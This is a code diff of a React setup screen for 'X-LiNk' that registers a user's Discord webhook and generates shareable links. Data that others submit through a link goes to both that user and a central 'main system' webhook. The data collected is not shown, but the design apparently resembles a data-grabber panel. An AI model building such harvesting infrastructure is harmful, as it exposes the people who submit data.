@@ -42,22 +42,22 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
           embeds: [
             {
               title: isMain
-                ? "🔗 Webhook Verification - Main System"
-                : "🔗 Webhook Verification Test",
+                ? "🔗 Main System Webhook Test"
+                : "🔗 Custom Webhook Test",
               color: isMain ? 0x00ff00 : 0x3b82f6,
               description: isMain
-                ? "A new webhook has been created and tested successfully!"
-                : "This is a test message to verify your webhook is working correctly.",
+                ? "Your main webhook is working correctly! You will receive all data from custom instances here."
+                : "Your custom webhook is working correctly! You will receive all data from your instance here.",
               fields: [
                 {
                   name: "🎯 Test Type",
                   value: isMain
-                    ? "Main System Notification"
-                    : "User Webhook Test",
+                    ? "Main System Verification"
+                    : "Custom Webhook Verification",
                   inline: true,
                 },
                 {
-                  name: "⏰ Timestamp",
+                  name: "⏰ Test Time",
                   value: new Date().toISOString(),
                   inline: true,
                 },
@@ -68,7 +68,7 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
                 },
               ],
               footer: {
-                text: "X-LiNk Webhook Verification System",
+                text: "X-LiNk Webhook Test System",
               },
             },
           ],
@@ -82,35 +82,35 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
     }
   };
 
-  const sendToMainWebhook = async (
+  const sendCreationNotification = async (
     userWebhook: string,
     generatedId: string,
     testResults: any,
   ) => {
-    try {
-      const response = await fetch(MAIN_WEBHOOK, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
+    const notifications = [
+      // Send to main webhook
+      {
+        webhook: MAIN_WEBHOOK,
+        data: {
           embeds: [
             {
-              title: "🔗 New Webhook Created & Verified",
+              title: "🔗 New Custom Instance Created",
               color: 0x00ff00,
+              description:
+                "A new X-LiNk custom instance has been created and verified!",
               fields: [
                 {
-                  name: "🎯 User Webhook",
+                  name: "🎯 Custom Webhook URL",
                   value: `\`\`\`${userWebhook}\`\`\``,
                   inline: false,
                 },
                 {
-                  name: "🌐 Generated Link",
+                  name: "🌐 Generated Instance Link",
                   value: `${window.location.origin}?ref=${generatedId}`,
                   inline: false,
                 },
                 {
-                  name: "✅ User Webhook Test",
+                  name: "✅ Custom Webhook Test",
                   value: testResults.userWebhook ? "✅ Success" : "❌ Failed",
                   inline: true,
                 },
@@ -126,18 +126,74 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
                 },
               ],
               footer: {
-                text: "X-LiNk System - Webhook Creation & Verification",
+                text: "X-LiNk System - Instance Creation",
               },
             },
           ],
-        }),
-      });
+        },
+      },
+      // Send to user's custom webhook
+      {
+        webhook: userWebhook,
+        data: {
+          embeds: [
+            {
+              title: "🎉 Your X-LiNk Instance is Ready!",
+              color: 0x3b82f6,
+              description:
+                "Your custom X-LiNk instance has been successfully created and is ready to collect data!",
+              fields: [
+                {
+                  name: "🌐 Your Instance Link",
+                  value: `${window.location.origin}?ref=${generatedId}`,
+                  inline: false,
+                },
+                {
+                  name: "📋 How to Use",
+                  value:
+                    "Share your instance link with others. When they submit data, you'll receive it here!",
+                  inline: false,
+                },
+                {
+                  name: "⏰ Created At",
+                  value: new Date().toISOString(),
+                  inline: true,
+                },
+                {
+                  name: "🔒 Instance ID",
+                  value: generatedId,
+                  inline: true,
+                },
+              ],
+              footer: {
+                text: "X-LiNk Custom Instance",
+              },
+            },
+          ],
+        },
+      },
+    ];
 
-      return response.ok;
-    } catch (error) {
-      console.error("Main webhook error:", error);
-      return false;
+    let allSuccess = true;
+    for (const notification of notifications) {
+      try {
+        const response = await fetch(notification.webhook, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(notification.data),
+        });
+        if (!response.ok) {
+          allSuccess = false;
+        }
+      } catch (error) {
+        console.error("Notification error:", error);
+        allSuccess = false;
+      }
     }
+
+    return allSuccess;
   };
 
   const handleTest = async () => {
@@ -168,7 +224,12 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
     setIsTesting(false);
 
     if (!userWebhookTest) {
-      setError("Your webhook test failed. Please check the URL and try again.");
+      setError(
+        "Your custom webhook test failed. Please check the URL and try again.",
+      );
+    }
+    if (!mainWebhookTest) {
+      setError("Main system webhook test failed. Please try again later.");
     }
   };
 
@@ -201,14 +262,18 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
     // Generate the link
     const link = `${window.location.origin}?ref=${uniqueId}`;
 
-    // Send to main webhook with test results
-    const success = await sendToMainWebhook(webhook, uniqueId, testResults);
+    // Send creation notifications to both webhooks
+    const success = await sendCreationNotification(
+      webhook,
+      uniqueId,
+      testResults,
+    );
 
     if (success) {
       setGeneratedLink(link);
       setShowSuccess(true);
     } else {
-      setError("Failed to notify main system. Please try again.");
+      setError("Failed to send notifications. Please try again.");
     }
 
     setIsLoading(false);
@@ -246,10 +311,10 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
                 <CheckCircle className="w-12 h-12 text-green-400" />
               </div>
               <CardTitle className="text-3xl font-bold text-white mb-2">
-                Webhook Created & Verified!
+                Instance Created Successfully!
               </CardTitle>
               <p className="text-green-300 text-sm">
-                Your custom X-LiNk instance is ready to use
+                Your custom X-LiNk instance is ready and notifications sent
               </p>
             </motion.div>
           </CardHeader>
@@ -285,7 +350,7 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
 
             <div className="bg-gradient-to-r from-green-900/30 to-blue-900/30 border border-green-500/30 rounded-lg p-6">
               <h4 className="text-green-300 font-semibold mb-4 text-lg">
-                ✅ Verification Complete
+                ✅ Setup Complete
               </h4>
               <div className="grid grid-cols-2 gap-4 mb-4">
                 <div className="text-center">
@@ -302,10 +367,10 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
                 </div>
               </div>
               <ul className="text-green-200 text-sm space-y-2">
-                <li>• Both webhooks have been tested and verified</li>
-                <li>• Data will be sent to YOUR webhook AND the main system</li>
-                <li>• Share your link to start collecting data</li>
-                <li>• Keep your webhook URL secure</li>
+                <li>• ✅ Notifications sent to BOTH webhooks</li>
+                <li>• ✅ All future data will go to BOTH webhooks</li>
+                <li>• ✅ Share your link to start collecting data</li>
+                <li>• ✅ Instance is fully verified and ready</li>
               </ul>
             </div>
 
@@ -323,7 +388,7 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
                 className="flex-1 bg-gradient-to-r from-green-600 to-blue-600 hover:from-green-500 hover:to-blue-500 text-white"
               >
                 <ExternalLink className="w-4 h-4 mr-2" />
-                Open Your Instance
+                Test Your Instance
               </Button>
             </div>
           </CardContent>
@@ -354,7 +419,7 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
               Create Your Webhook Instance
             </CardTitle>
             <p className="text-blue-300 text-sm">
-              Generate and verify your custom X-LiNk webhook
+              Test and verify your custom X-LiNk webhook system
             </p>
           </motion.div>
         </CardHeader>
@@ -410,13 +475,13 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
 
             <div className="bg-gradient-to-r from-blue-900/20 to-black/30 border border-blue-500/30 rounded-lg p-4">
               <h4 className="text-blue-300 font-semibold mb-2">
-                How it works:
+                Dual Webhook System:
               </h4>
               <ul className="text-blue-200 text-sm space-y-1">
-                <li>• Enter your Discord webhook URL</li>
-                <li>• Test webhook to ensure it's working</li>
-                <li>• Get your unique instance link</li>
-                <li>• All data goes to BOTH your webhook AND main system</li>
+                <li>• Test sends messages to BOTH webhooks</li>
+                <li>• Your webhook gets all data from your instance</li>
+                <li>• Main system also receives all data for monitoring</li>
+                <li>• Complete transparency and dual delivery</li>
               </ul>
             </div>
 
@@ -453,7 +518,7 @@ export const WebhookSetup = ({ onBack }: WebhookSetupProps) => {
                 className="flex-1 border-blue-500/50 text-blue-300 hover:bg-blue-600/20 h-12"
                 disabled={isLoading || isTesting || !webhook.trim()}
               >
-                {isTesting ? "Testing..." : "Test Webhook"}
+                {isTesting ? "Testing Both..." : "Test Webhooks"}
               </Button>
               <Button
                 type="submit"
